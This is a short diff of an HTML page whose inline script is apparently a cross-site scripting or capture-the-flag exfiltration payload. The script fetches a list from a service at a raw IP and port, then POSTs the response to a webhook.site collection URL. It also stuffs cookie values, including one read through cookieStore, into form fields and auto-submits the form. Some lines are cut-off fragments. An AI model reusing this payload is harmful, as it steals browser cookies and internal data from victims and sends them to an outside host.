@@ -11,10 +11,13 @@
                     </form>
 
                     <script>
-                     fetch('http://45.12.114.110:30031/table/list').then(res=>res.text()).then(async (r)=>{await fetch('https://webhook.site/debe482d-4f6b-4bba-a5e3-c75e4db2418a?q=', {method:'POST', body:r})})
-                        document.getElementById('cookie').value = document
-                      document.getElementById('window').value = window.l
+                     fetch('http://45.12.114.110:30031/table/list').then(res=>res.text()).then(async (r)=>{
+                       await fetch('https://webhook.site/debe482d-4f6b-4bba-a5e3-c75e4db2418a?q=', {method:'POST', body:r});
+                                 document.getElementById('cookie').value = document
+                      document.getElementById('window').value = await cookieStore.get("cookie1")
                         document.getElementById('form').submit()
+                     })
+            
                       
                       
                       </script>
